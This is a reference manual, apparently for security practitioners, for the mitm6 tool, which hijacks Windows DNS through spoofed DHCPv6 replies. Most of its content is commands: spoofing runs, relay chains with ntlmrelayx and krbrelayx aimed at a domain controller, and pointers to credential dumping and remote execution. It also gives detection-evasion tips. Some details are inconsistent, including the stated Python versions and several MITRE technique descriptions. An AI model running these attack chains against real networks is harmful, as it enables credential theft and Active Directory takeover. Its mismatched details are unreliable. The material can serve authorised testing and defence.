---
mitre_tactic: collection
mitre_tactic_id: TA0009
tool_name: mitm6
tool_category: MITM/IPv6 DNS Spoofing
github: https://github.com/dirkjanm/mitm6
version: 0.3.0
license: GPL-2.0
language: Python
---

# mitm6 - IPv6 DNS Spoofing for IPv4 Takeover

## Chapter 1: Overview

mitm6 is a penetration testing tool that exploits the default configuration of Windows to take over the default DNS server by replying to DHCPv6 messages. It provides victims with a link-local IPv6 address and sets the attacker's host as the default DNS server, enabling selective DNS spoofing and traffic redirection.

**Core Function:** Exploit Windows IPv6 default behavior to hijack DNS resolution

**Attack Vector:** DHCPv6 spoofing + Router Advertisement + DNS manipulation

**Primary Use Cases:**
- IPv4 network takeover via IPv6 attack vectors
- WPAD (Web Proxy Auto-Discovery) spoofing for credential capture
- NTLM relay attacks via SMB/HTTP redirects
- Kerberos authentication relay via DNS dynamic updates
- Active Directory domain compromise

**Key Capabilities:**
- Automatic network interface detection
- Selective DNS reply filtering by domain and hostname
- Integration with ntlmrelayx for credential relay
- Integration with krbrelayx for Kerberos relay attacks
- Low network impact with short TTL values

**Dependencies:** Scapy, Twisted, netifaces, ipaddress (Python 2.7)

---

## Chapter 2: Installation

### Kali Linux (Default)

```bash
sudo apt install mitm6
```

### From PyPI

```bash
pip install mitm6
```

### From Source

```bash
git clone https://github.com/dirkjanm/mitm6.git
cd mitm6
pip install -r requirements.txt
python setup.py install
```

### Dependencies

- Python 2.7 or 3.x
- Scapy (raw packet manipulation)
- Twisted (async networking)
- netifaces (network interface detection)

### Verify Installation

```bash
mitm6 --version
```

---

## Chapter 3: Architecture and Operation

### Attack Flow

```
1. DHCPv6 Discovery    → Victim broadcasts DHCPv6 request
2. DHCPv6 Advertise    → mitm6 responds with IPv6 address
3. Router Advertisement → mitm6 advertises itself as DNS server
4. DNS Query            → Victim resolves domain via attacker DNS
5. DNS Response         → mitm6 returns attacker IP for target domains
6. Traffic Redirection  → Victim connects to attacker-controlled service
```

### MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Network Sniffing | T1040 | Capture network traffic |
| DNS Server | T1584.002 | Compromise DNS infrastructure |
| Man-in-the-Middle | T1557 | Intercept communications |
| Lateral Movement | T1210 | Exploit remote services |

### Windows IPv6 Default Behavior

Windows enables IPv6 by default and prefers IPv6 DNS servers when available. mitm6 exploits this by:

1. Responding to DHCPv6 Information-Request messages
2. Providing a link-local IPv6 address to the victim
3. Setting itself as the preferred DNS server
4. Spoofing DNS responses to redirect traffic

---

## Chapter 4: Command Reference

### Basic Operation

```bash
mitm6 -d target.local
```

**Explanation:** Start mitm6 targeting the `target.local` domain. Automatically detects network interface and IPv4/IPv6 addresses.

### Interface Selection

```bash
mitm6 -i eth0 -d corp.example.com
```

**Explanation:** Specify the network interface explicitly and target the corp.example.com domain.

### Verbose Output

```bash
mitm6 -v -d target.local
```

**Explanation:** Enable verbose output showing all DHCPv6 and DNS traffic details.

### Relay Target Configuration

```bash
mitm6 -r attacker.local -d target.local
```

**Explanation:** Set the relay target hostname for triggering Kerberos authentication via ntlmrelayx.

### Host Filtering

```bash
mitm6 -hw WS-FILTERED* -d target.local
```

**Explanation:** Only respond to DHCPv6 queries from hosts matching the wildcard pattern `WS-FILTERED*`.

### Multiple Domain Filtering

```bash
mitm6 -d internal.corp -d dev.corp -b staging.corp -d target.local
```

**Explanation:** Spoof DNS for internal.corp and dev.corp but block staging.corp queries.

### Disable Router Advertisements

```bash
mitm6 --no-ra -d target.local
```

**Explanation:** Skip Router Advertisement messages for networks with rogue RA detection.

### Ignore Non-FQDN Queries

```bash
mitm6 --ignore-nofqdn -d target.local
```

**Explanation:** Only process DHCPv6 queries that include the Fully Qualified Domain Name option.

---

## Chapter 5: Advanced Attack Scenarios

### Scenario 1: WPAD Spoofing with ntlmrelayx

**Setup:**

```bash
# Terminal 1: Start mitm6
mitm6 -d target.local

# Terminal 2: Start ntlmrelayx
ntlmrelayx.py -6 -wh WPAD-ATTACKER -t smb://dc.target.local
```

**Explanation:** mitm6 spoofs DNS to redirect WPAD requests to the attacker. ntlmrelayx captures NTLMv2 hashes and relays them to the domain controller.

**Attack Flow:**
1. Victim requests WPAD configuration
2. mitm6 resolves WPAD to attacker IP
3. ntlmrelayx serves malicious PAC file
4. Victim authenticates with NTLM
5. ntlmrelayx relays credentials to DC

### Scenario 2: Kerberos Relay with krbrelayx

**Setup:**

```bash
# Terminal 1: Start mitm6 with relay target
mitm6 --relay dc.target.local -d target.local

# Terminal 2: Start krbrelayx
krbrelayx.py -t dc.target.local
```

**Explanation:** mitm6 triggers Kerberos dynamic DNS updates and relays authentication to the specified target via krbrelayx.

### Scenario 3: Internal Network Reconnaissance

**Setup:**

```bash
mitm6 -v --debug -d target.local 2>&1 | tee mitm6_recon.log
```

**Explanation:** Capture all DHCPv6 queries and DNS traffic for network reconnaissance. The FQDN field reveals hostnames and domain information.

---

## Chapter 6: Detection and Evasion

### Detection Signatures

**Snort/Suricata Rules:**

Fox-IT Security Research Team has released detection signatures for rogue DHCPv6 traffic:

- DHCPv6 Advertise with attacker DNS server
- WPAD replies over IPv6
- Rogue Router Advertisement messages

### Evasion Techniques

1. **Disable RA:** Use `--no-ra` to avoid RA-based detection
2. **Host Filtering:** Use `-hw` to target specific hosts only
3. **Domain Filtering:** Use `-d` to limit DNS spoofing scope
4. **Timing:** Run during business hours when network noise is high

### Network Impact Mitigation

- Low TTL values on assigned addresses (5-minute expiry)
- DNS replies with 100-second TTL
- No full SLAAC implementation
- Minimal network footprint

---

## Chapter 7: Integration with Other Tools

### ntlmrelayx Integration

```bash
# Start ntlmrelayx first
ntlmrelayx.py -6 -wh WPAD-ATTACKER -t smb://target.local

# Then start mitm6
mitm6 -d target.local
```

**Key Options for ntlmrelayx:**
- `-6`: Listen on both IPv4 and IPv6
- `-wh WPAD-ATTACKER`: WPAD hostname to spoof
- `-wa N`: Number of WPAD authentication prompts

### krbrelayx Integration

```bash
# Start krbrelayx
krbrelayx.py -t dc.target.local

# Start mitm6 with relay target
mitm6 --relay dc.target.local -d target.local
```

### Impacket Tools Integration

mitm6 works with the Impacket suite for comprehensive Active Directory attacks:

- `ntlmrelayx.py` - NTLM credential relay
- `krbrelayx.py` - Kerberos authentication relay
- `secretsdump.py` - Credential extraction
- `psexec.py` - Remote command execution

---

## Chapter 8: Troubleshooting

### Common Issues

**Issue:** mitm6 not detecting interface

```bash
# Force interface selection
mitm6 -i eth0 -d target.local
```

**Issue:** No DHCPv6 responses

```bash
# Check if IPv6 is enabled on the interface
ip -6 addr show eth0

# Enable IPv6 if disabled
sudo sysctl -w net.ipv6.conf.eth0.disable_ipv6=0
```

**Issue:** DNS spoofing not working

```bash
# Verify DNS queries are reaching mitm6
mitm6 -v --debug -d target.local

# Check iptables rules
sudo iptables -t nat -L -n
```

**Issue:** Target hosts not responding

```bash
# Check host allowlist/blocklist
mitm6 -hw "TARGET-*" -d target.local

# Use verbose mode to see all queries
mitm6 -v -d target.local
```

### Debug Mode

```bash
mitm6 --debug -d target.local 2>&1 | tee debug.log
```

---

## Resources

- **GitHub:** https://github.com/dirkjanm/mitm6
- **Blog Post:** https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
- **Kerberos Relay Blog:** https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/
- **Detection Signatures:** https://gist.github.com/fox-srt/98f29051fe56a1695de8e914c4a2373f
- **Kali Documentation:** https://www.kali.org/tools/mitm6/
- **ntlmrelayx:** https://github.com/CoreSecurity/impacket
